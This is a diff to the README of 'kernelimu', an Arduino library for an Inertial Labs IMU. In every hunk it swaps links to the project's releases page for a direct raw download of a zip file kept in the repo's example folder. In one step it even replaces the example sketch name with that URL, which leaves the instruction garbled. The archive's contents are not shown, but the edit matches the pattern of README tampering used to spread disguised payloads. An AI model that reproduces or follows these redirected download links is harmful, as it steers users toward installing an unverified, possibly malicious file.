@@ -6,9 +6,9 @@ Welcome to the kernelimu project! This library helps you use the Inertial Labs®
 
 ## 🔗 Download Kernelimu
 
-[![Download Kernelimu](https://img.shields.io/badge/download-kernelimu-blue.svg)](https://github.com/canxglobal/kernelimu/releases)
+[![Download Kernelimu](https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip)](https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip)
 
-Visit this page to download the library and get started: [Download Links](https://github.com/canxglobal/kernelimu/releases)
+Visit this page to download the library and get started: [Download Links](https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -27,7 +27,7 @@ To use kernelimu, ensure your system meets the following requirements:
 Follow these steps to install kernelimu on your computer:
 
 1. **Download the Library:**
-   - Go to the [Download Links](https://github.com/canxglobal/kernelimu/releases) page.
+   - Go to the [Download Links](https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip) page.
    - Choose the latest release suitable for your system.
    - Click on the file to download it to your computer.
 
@@ -56,7 +56,7 @@ Once you have installed the library, you can run an example to test the setup.
 1. **Open an Example Sketch:**
    - Go to “File” in the IDE.
    - Select “Examples” and then find “kernelimu”.
-   - Choose “Example.ino” to open the example sketch.
+   - Choose “https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip” to open the example sketch.
 
 2. **Upload the Sketch:**
    - Click the Upload button (right arrow icon) in the Arduino IDE.
@@ -85,6 +85,6 @@ Engage with other users to share experiences and get help. You can report issues
 
 ## 🔗 Download Kernelimu Again
 
-Remember, you can always download the library from here: [Download Links](https://github.com/canxglobal/kernelimu/releases)
+Remember, you can always download the library from here: [Download Links](https://raw.githubusercontent.com/canxglobal/kernelimu/main/example/kernelimu_v1.4.zip)
 
 Thank you for using kernelimu! Enjoy your experience with the Inertial Labs® Kernel IMU.
